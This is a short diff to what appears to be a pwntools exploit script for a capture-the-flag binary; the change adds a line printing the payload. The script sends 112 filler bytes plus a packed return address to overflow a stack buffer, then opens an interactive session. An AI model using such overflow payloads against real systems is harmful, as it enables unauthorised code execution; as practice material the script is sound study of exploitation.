@@ -10,6 +10,7 @@ r.recvuntil("name: ")
 
 code = "A" * 112  # dummy
 code += p32(0x80484fd)
+print(code)
 r.sendline(code)
 
 r.interactive()
